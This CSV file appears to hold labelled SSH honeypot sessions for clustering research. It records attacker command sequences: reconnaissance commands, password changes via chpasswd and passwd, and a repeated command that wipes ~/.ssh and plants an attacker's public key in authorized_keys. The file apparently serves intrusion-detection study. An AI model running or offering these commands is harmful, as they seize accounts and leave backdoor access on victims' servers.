,session,command_freq,input,attack_cat,label_nr,label_desc,duration,SeededKmeans_result,Kmeans_results,PCKmeans_exp_result
11830,59b843030ac2,15,crontab -l,Malicious activity,1,SSH attack,6.781432390213013,1,2,3
11831,59b843030ac2,15,w,Malicious activity,1,SSH attack,6.781432390213013,1,2,3
11832,59b843030ac2,15,uname -m,Malicious activity,1,SSH attack,6.781432390213013,1,2,3
11833,59b843030ac2,15,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,6.781432390213013,1,2,3
11834,59b843030ac2,15,top,Malicious activity,1,SSH attack,6.781432390213013,1,2,3
11835,59b843030ac2,15,uname,Malicious activity,1,SSH attack,6.781432390213013,1,2,3
11836,59b843030ac2,15,uname -a,Malicious activity,1,SSH attack,6.781432390213013,1,2,3
11837,59b843030ac2,15,lscpu | grep Model,Malicious activity,1,SSH attack,6.781432390213013,1,2,3
11838,59b843030ac2,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,6.781432390213013,1,2,3
11839,9dab4f4c9b94,15,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,6.863949298858643,1,2,3
11840,9dab4f4c9b94,15,"echo ""root:TOZ2MTn1V6w7""|chpasswd|bash",Malicious activity,1,SSH attack,6.863949298858643,1,2,3
11841,9dab4f4c9b94,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,6.863949298858643,1,2,3
11842,9dab4f4c9b94,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,6.863949298858643,1,2,3
11843,9dab4f4c9b94,15,ls -lh $(which ls),Malicious activity,1,SSH attack,6.863949298858643,1,2,3
11844,9dab4f4c9b94,15,which ls,Malicious activity,1,SSH attack,6.863949298858643,1,2,3
11845,9dab4f4c9b94,15,crontab -l,Malicious activity,1,SSH attack,6.863949298858643,1,2,3
11846,9dab4f4c9b94,15,w,Malicious activity,1,SSH attack,6.863949298858643,1,2,3
11847,9dab4f4c9b94,15,uname -m,Malicious activity,1,SSH attack,6.863949298858643,1,2,3
11848,9dab4f4c9b94,15,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,6.863949298858643,1,2,3
11849,9dab4f4c9b94,15,top,Malicious activity,1,SSH attack,6.863949298858643,1,2,3
11850,9dab4f4c9b94,15,uname,Malicious activity,1,SSH attack,6.863949298858643,1,2,3
11851,9dab4f4c9b94,15,uname -a,Malicious activity,1,SSH attack,6.863949298858643,1,2,3
11852,9dab4f4c9b94,15,lscpu | grep Model,Malicious activity,1,SSH attack,6.863949298858643,1,2,3
11853,9dab4f4c9b94,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,6.863949298858643,1,2,3
11854,a2c7d2d9a530,15,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,6.877803564071655,1,2,3
11855,a2c7d2d9a530,15,"echo ""root:FrAiEpgRczJV""|chpasswd|bash",Malicious activity,1,SSH attack,6.877803564071655,1,2,3
11856,a2c7d2d9a530,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,6.877803564071655,1,2,3
11857,a2c7d2d9a530,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,6.877803564071655,1,2,3
11858,a2c7d2d9a530,15,ls -lh $(which ls),Malicious activity,1,SSH attack,6.877803564071655,1,2,3
11859,a2c7d2d9a530,15,which ls,Malicious activity,1,SSH attack,6.877803564071655,1,2,3
11860,a2c7d2d9a530,15,crontab -l,Malicious activity,1,SSH attack,6.877803564071655,1,2,3
11861,a2c7d2d9a530,15,w,Malicious activity,1,SSH attack,6.877803564071655,1,2,3
11862,a2c7d2d9a530,15,uname -m,Malicious activity,1,SSH attack,6.877803564071655,1,2,3
11863,a2c7d2d9a530,15,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,6.877803564071655,1,2,3
11864,a2c7d2d9a530,15,top,Malicious activity,1,SSH attack,6.877803564071655,1,2,3
11865,a2c7d2d9a530,15,uname,Malicious activity,1,SSH attack,6.877803564071655,1,2,3
11866,a2c7d2d9a530,15,uname -a,Malicious activity,1,SSH attack,6.877803564071655,1,2,3
11867,a2c7d2d9a530,15,lscpu | grep Model,Malicious activity,1,SSH attack,6.877803564071655,1,2,3
11868,a2c7d2d9a530,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,6.877803564071655,1,2,3
11869,d19de1c80879,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,6.917884349822998,1,2,3
11870,d19de1c80879,18,"echo -e ""emqttd\nOBDalnNIzJLm\nOBDalnNIzJLm""|passwd|bash",Malicious activity,1,SSH attack,6.917884349822998,1,2,3
11871,d19de1c80879,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,6.917884349822998,1,2,3
11872,d19de1c80879,18,Enter new UNIX password:,Malicious activity,1,SSH attack,6.917884349822998,1,2,3
11873,d19de1c80879,18,"echo ""emqttd\nOBDalnNIzJLm\nOBDalnNIzJLm\n""|passwd",Malicious activity,1,SSH attack,6.917884349822998,1,2,3
11874,d19de1c80879,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,6.917884349822998,1,2,3
11875,d19de1c80879,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,6.917884349822998,1,2,3
11876,d19de1c80879,18,ls -lh $(which ls),Malicious activity,1,SSH attack,6.917884349822998,1,2,3
11877,d19de1c80879,18,which ls,Malicious activity,1,SSH attack,6.917884349822998,1,2,3
11878,d19de1c80879,18,crontab -l,Malicious activity,1,SSH attack,6.917884349822998,1,2,3
11879,d19de1c80879,18,w,Malicious activity,1,SSH attack,6.917884349822998,1,2,3
11880,d19de1c80879,18,uname -m,Malicious activity,1,SSH attack,6.917884349822998,1,2,3
11881,d19de1c80879,18,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,6.917884349822998,1,2,3
11882,d19de1c80879,18,top,Malicious activity,1,SSH attack,6.917884349822998,1,2,3
11883,d19de1c80879,18,uname,Malicious activity,1,SSH attack,6.917884349822998,1,2,3
11884,d19de1c80879,18,uname -a,Malicious activity,1,SSH attack,6.917884349822998,1,2,3
11885,d19de1c80879,18,lscpu | grep Model,Malicious activity,1,SSH attack,6.917884349822998,1,2,3
11886,d19de1c80879,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,6.917884349822998,1,2,3
11887,2fd0aaaf8b21,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,6.952584981918335,1,2,3
11888,2fd0aaaf8b21,18,"echo -e ""wpuser\nrB45ZP9qEHHd\nrB45ZP9qEHHd""|passwd|bash",Malicious activity,1,SSH attack,6.952584981918335,1,2,3
11889,2fd0aaaf8b21,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,6.952584981918335,1,2,3
11890,2fd0aaaf8b21,18,Enter new UNIX password:,Malicious activity,1,SSH attack,6.952584981918335,1,2,3
11891,2fd0aaaf8b21,18,"echo ""wpuser\nrB45ZP9qEHHd\nrB45ZP9qEHHd\n""|passwd",Malicious activity,1,SSH attack,6.952584981918335,1,2,3
11892,2fd0aaaf8b21,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,6.952584981918335,1,2,3
11893,2fd0aaaf8b21,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,6.952584981918335,1,2,3
11894,2fd0aaaf8b21,18,ls -lh $(which ls),Malicious activity,1,SSH attack,6.952584981918335,1,2,3
11895,2fd0aaaf8b21,18,which ls,Malicious activity,1,SSH attack,6.952584981918335,1,2,3
11896,2fd0aaaf8b21,18,crontab -l,Malicious activity,1,SSH attack,6.952584981918335,1,2,3
11897,2fd0aaaf8b21,18,w,Malicious activity,1,SSH attack,6.952584981918335,1,2,3
11898,2fd0aaaf8b21,18,uname -m,Malicious activity,1,SSH attack,6.952584981918335,1,2,3
11899,2fd0aaaf8b21,18,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,6.952584981918335,1,2,3
11900,2fd0aaaf8b21,18,top,Malicious activity,1,SSH attack,6.952584981918335,1,2,3
11901,2fd0aaaf8b21,18,uname,Malicious activity,1,SSH attack,6.952584981918335,1,2,3
11902,2fd0aaaf8b21,18,uname -a,Malicious activity,1,SSH attack,6.952584981918335,1,2,3
11903,2fd0aaaf8b21,18,lscpu | grep Model,Malicious activity,1,SSH attack,6.952584981918335,1,2,3
11904,2fd0aaaf8b21,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,6.952584981918335,1,2,3
11905,91f301fe42d2,15,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,6.955907583236694,1,2,3
11906,91f301fe42d2,15,"echo ""root:uP7VTDWsy9ff""|chpasswd|bash",Malicious activity,1,SSH attack,6.955907583236694,1,2,3
11907,91f301fe42d2,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,6.955907583236694,1,2,3
11908,91f301fe42d2,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,6.955907583236694,1,2,3
11909,91f301fe42d2,15,ls -lh $(which ls),Malicious activity,1,SSH attack,6.955907583236694,1,2,3
11910,91f301fe42d2,15,which ls,Malicious activity,1,SSH attack,6.955907583236694,1,2,3
11911,91f301fe42d2,15,crontab -l,Malicious activity,1,SSH attack,6.955907583236694,1,2,3
11912,91f301fe42d2,15,w,Malicious activity,1,SSH attack,6.955907583236694,1,2,3
11913,91f301fe42d2,15,uname -m,Malicious activity,1,SSH attack,6.955907583236694,1,2,3
11914,91f301fe42d2,15,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,6.955907583236694,1,2,3
11915,91f301fe42d2,15,top,Malicious activity,1,SSH attack,6.955907583236694,1,2,3
11916,91f301fe42d2,15,uname,Malicious activity,1,SSH attack,6.955907583236694,1,2,3
11917,91f301fe42d2,15,uname -a,Malicious activity,1,SSH attack,6.955907583236694,1,2,3
11918,91f301fe42d2,15,lscpu | grep Model,Malicious activity,1,SSH attack,6.955907583236694,1,2,3
11919,91f301fe42d2,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,6.955907583236694,1,2,3
11920,4dd9da304bbf,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,69.60326194763184,1,2,3
11921,4dd9da304bbf,18,"echo -e ""qwerty\n5mhX7xQDl3yG\n5mhX7xQDl3yG""|passwd|bash",Malicious activity,1,SSH attack,69.60326194763184,1,2,3
11922,4dd9da304bbf,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,69.60326194763184,1,2,3
11923,4dd9da304bbf,18,Enter new UNIX password:,Malicious activity,1,SSH attack,69.60326194763184,1,2,3
11924,4dd9da304bbf,18,"echo ""qwerty\n5mhX7xQDl3yG\n5mhX7xQDl3yG\n""|passwd",Malicious activity,1,SSH attack,69.60326194763184,1,2,3
11925,4dd9da304bbf,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,69.60326194763184,1,2,3
11926,4dd9da304bbf,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,69.60326194763184,1,2,3
11927,4dd9da304bbf,18,ls -lh $(which ls),Malicious activity,1,SSH attack,69.60326194763184,1,2,3
11928,4dd9da304bbf,18,which ls,Malicious activity,1,SSH attack,69.60326194763184,1,2,3
11929,4dd9da304bbf,18,crontab -l,Malicious activity,1,SSH attack,69.60326194763184,1,2,3
11930,4dd9da304bbf,18,w,Malicious activity,1,SSH attack,69.60326194763184,1,2,3
11931,4dd9da304bbf,18,uname -m,Malicious activity,1,SSH attack,69.60326194763184,1,2,3
11932,4dd9da304bbf,18,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,69.60326194763184,1,2,3
11933,4dd9da304bbf,18,top,Malicious activity,1,SSH attack,69.60326194763184,1,2,3
11934,4dd9da304bbf,18,uname,Malicious activity,1,SSH attack,69.60326194763184,1,2,3
11935,4dd9da304bbf,18,uname -a,Malicious activity,1,SSH attack,69.60326194763184,1,2,3
11936,4dd9da304bbf,18,lscpu | grep Model,Malicious activity,1,SSH attack,69.60326194763184,1,2,3
11937,4dd9da304bbf,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,69.60326194763184,1,2,3
11938,3c8a339c832e,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,6.965692281723023,1,2,3
11939,3c8a339c832e,18,"echo -e ""admin123\nVHL905VHrqqg\nVHL905VHrqqg""|passwd|bash",Malicious activity,1,SSH attack,6.965692281723023,1,2,3
11940,3c8a339c832e,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,6.965692281723023,1,2,3
11941,3c8a339c832e,18,Enter new UNIX password:,Malicious activity,1,SSH attack,6.965692281723023,1,2,3
11942,3c8a339c832e,18,"echo ""admin123\nVHL905VHrqqg\nVHL905VHrqqg\n""|passwd",Malicious activity,1,SSH attack,6.965692281723023,1,2,3
11943,3c8a339c832e,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,6.965692281723023,1,2,3
11944,3c8a339c832e,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,6.965692281723023,1,2,3
11945,3c8a339c832e,18,ls -lh $(which ls),Malicious activity,1,SSH attack,6.965692281723023,1,2,3
11946,3c8a339c832e,18,which ls,Malicious activity,1,SSH attack,6.965692281723023,1,2,3
11947,3c8a339c832e,18,crontab -l,Malicious activity,1,SSH attack,6.965692281723023,1,2,3
11948,3c8a339c832e,18,w,Malicious activity,1,SSH attack,6.965692281723023,1,2,3
11949,3c8a339c832e,18,uname -m,Malicious activity,1,SSH attack,6.965692281723023,1,2,3
11950,3c8a339c832e,18,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,6.965692281723023,1,2,3
11951,3c8a339c832e,18,top,Malicious activity,1,SSH attack,6.965692281723023,1,2,3
11952,3c8a339c832e,18,uname,Malicious activity,1,SSH attack,6.965692281723023,1,2,3
11953,3c8a339c832e,18,uname -a,Malicious activity,1,SSH attack,6.965692281723023,1,2,3
11954,3c8a339c832e,18,lscpu | grep Model,Malicious activity,1,SSH attack,6.965692281723023,1,2,3
11955,3c8a339c832e,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,6.965692281723023,1,2,3
11956,0e22e9942c8e,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,6.975148677825928,1,2,3
11957,0e22e9942c8e,18,"echo -e ""qwerty\nUUizh4T7zutE\nUUizh4T7zutE""|passwd|bash",Malicious activity,1,SSH attack,6.975148677825928,1,2,3
11958,0e22e9942c8e,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,6.975148677825928,1,2,3
11959,0e22e9942c8e,18,Enter new UNIX password:,Malicious activity,1,SSH attack,6.975148677825928,1,2,3
11960,0e22e9942c8e,18,"echo ""qwerty\nUUizh4T7zutE\nUUizh4T7zutE\n""|passwd",Malicious activity,1,SSH attack,6.975148677825928,1,2,3
11961,0e22e9942c8e,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,6.975148677825928,1,2,3
11962,0e22e9942c8e,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,6.975148677825928,1,2,3
11963,0e22e9942c8e,18,ls -lh $(which ls),Malicious activity,1,SSH attack,6.975148677825928,1,2,3
11964,0e22e9942c8e,18,which ls,Malicious activity,1,SSH attack,6.975148677825928,1,2,3
11965,0e22e9942c8e,18,crontab -l,Malicious activity,1,SSH attack,6.975148677825928,1,2,3
11966,0e22e9942c8e,18,w,Malicious activity,1,SSH attack,6.975148677825928,1,2,3
11967,0e22e9942c8e,18,uname -m,Malicious activity,1,SSH attack,6.975148677825928,1,2,3
11968,0e22e9942c8e,18,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,6.975148677825928,1,2,3
11969,0e22e9942c8e,18,top,Malicious activity,1,SSH attack,6.975148677825928,1,2,3
11970,0e22e9942c8e,18,uname,Malicious activity,1,SSH attack,6.975148677825928,1,2,3
11971,0e22e9942c8e,18,uname -a,Malicious activity,1,SSH attack,6.975148677825928,1,2,3
11972,0e22e9942c8e,18,lscpu | grep Model,Malicious activity,1,SSH attack,6.975148677825928,1,2,3
11973,0e22e9942c8e,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,6.975148677825928,1,2,3
11974,8a2a511a85a8,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,6.985625743865967,1,2,3
11975,8a2a511a85a8,18,"echo -e ""winner\nAMQSu1SkSXu9\nAMQSu1SkSXu9""|passwd|bash",Malicious activity,1,SSH attack,6.985625743865967,1,2,3
11976,8a2a511a85a8,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,6.985625743865967,1,2,3
11977,8a2a511a85a8,18,Enter new UNIX password:,Malicious activity,1,SSH attack,6.985625743865967,1,2,3
11978,8a2a511a85a8,18,"echo ""winner\nAMQSu1SkSXu9\nAMQSu1SkSXu9\n""|passwd",Malicious activity,1,SSH attack,6.985625743865967,1,2,3
11979,8a2a511a85a8,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,6.985625743865967,1,2,3
11980,8a2a511a85a8,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,6.985625743865967,1,2,3
11981,8a2a511a85a8,18,ls -lh $(which ls),Malicious activity,1,SSH attack,6.985625743865967,1,2,3
11982,8a2a511a85a8,18,which ls,Malicious activity,1,SSH attack,6.985625743865967,1,2,3
11983,8a2a511a85a8,18,crontab -l,Malicious activity,1,SSH attack,6.985625743865967,1,2,3
11984,8a2a511a85a8,18,w,Malicious activity,1,SSH attack,6.985625743865967,1,2,3
11985,8a2a511a85a8,18,uname -m,Malicious activity,1,SSH attack,6.985625743865967,1,2,3
11986,8a2a511a85a8,18,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,6.985625743865967,1,2,3
11987,8a2a511a85a8,18,top,Malicious activity,1,SSH attack,6.985625743865967,1,2,3
11988,8a2a511a85a8,18,uname,Malicious activity,1,SSH attack,6.985625743865967,1,2,3
11989,8a2a511a85a8,18,uname -a,Malicious activity,1,SSH attack,6.985625743865967,1,2,3
11990,8a2a511a85a8,18,lscpu | grep Model,Malicious activity,1,SSH attack,6.985625743865967,1,2,3
11991,8a2a511a85a8,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,6.985625743865967,1,2,3
